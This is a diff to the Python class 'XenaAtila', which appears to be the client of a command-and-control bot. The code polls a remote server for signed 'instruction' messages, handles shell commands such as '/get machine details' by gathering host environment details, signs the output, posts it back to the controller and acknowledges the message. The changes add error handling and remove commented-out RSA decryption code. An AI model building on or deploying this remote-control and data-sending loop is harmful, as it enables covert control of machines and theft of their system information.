@@ -8,8 +8,6 @@ from env import Env
 from requests import post, get
 from uuid import uuid4
 from typing import Union
-
-from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 
 from services.system import System
@@ -45,7 +43,11 @@ class XenaAtila:
       sleep(10)
 
   def read_inbox(self, remote_host: str) -> Union[Message, None]:
-    messages_response = get(remote_host + '/v1/messages?clientId=' + client_id + '&status=SENT')
+    try:
+      messages_response = get(remote_host + '/v1/messages?clientId=' + client_id + '&status=SENT')
+    except Exception as e:
+      logging.warning('Unable to reach the remote in order to read the inbox. ' + str(e))
+      return
 
     # No messages for the client.
     if (messages_response.status_code != 200):
@@ -53,33 +55,21 @@ class XenaAtila:
 
     maybe_messages = json.loads(messages_response.content.decode('utf-8'))
 
-    # Loop over each message.
+    # Loop over each messages.
     for maybe_message in maybe_messages:
       message = Message.from_json(maybe_message)
-
       subject = message.subject
+
+      # Verify and decode the message.
       try:
-        # content = jwt.verify_jwt(message.content, jwk.JWK.from_pem(Env()['MASTER_PUBLIC_KEY']), ['RS512'])[1]
         receivedToken = jwt.JWT(key = jwk.JWK.from_pem(Env()['MASTER_PUBLIC_KEY']), jwt = message.content)
         content = json.loads(receivedToken.claims)
       except Exception as e:
         logging.warning('Unable to verify the token.' + str(e))
         continue
       
-      # dec = PKCS1_OAEP.new(Env()['MASTER_PUBLIC_KEY'])
-      # test = dec.decrypt(bytes.fromhex(content['payload']))
-
       if subject != 'instruction':
         return
-
-      # master_public_key = RSA.importKey(Env()['MASTER_PUBLIC_KEY'])
-      # master_public_key = PKCS1_OAEP.new(master_public_key)
-      # content = master_public_key.decrypt(bytes.fromhex(content['payload']))
-
-      #RSA encryption protocol according to PKCS#1 OAEP
-      # dec = PKCS1_OAEP.new(Env()['MASTER_PUBLIC_KEY'])
-      # test = dec.decrypt(bytes.fromhex(content['payload']))
-      # print(test)
 
       output = str
       
@@ -110,11 +100,7 @@ class XenaAtila:
       if content['shell'] is not None and content['shell'] == '/get machine details':
         output = json.dumps(System.environment_details())
 
-      # Encrypt the response.
-      # master_public_key = RSA.importKey(Env()['MASTER_PUBLIC_KEY'])
-      # master_public_key = PKCS1_OAEP.new(master_public_key)
-      # output = master_public_key.encrypt(bytes(output, encoding = 'utf8'))
-
+      # Sign the response.
       token = jwt.JWT(
         header = { 'alg': 'RS512' },
         claims = output,
@@ -135,10 +121,12 @@ class XenaAtila:
         logging.debug('Failed to insert a message reply.')
         continue
       
+      # Ack. the message.
       message_ack = post(self.remote + '/v1/messages/ack', data = {
         'id': message.id,
       })
 
+      # Failed to ack. the message.
       if (message_ack.status_code != 200):
         logging.warn('Message ACK failure has occured, but it is not handled!')
         logging.debug(message_ack.json())
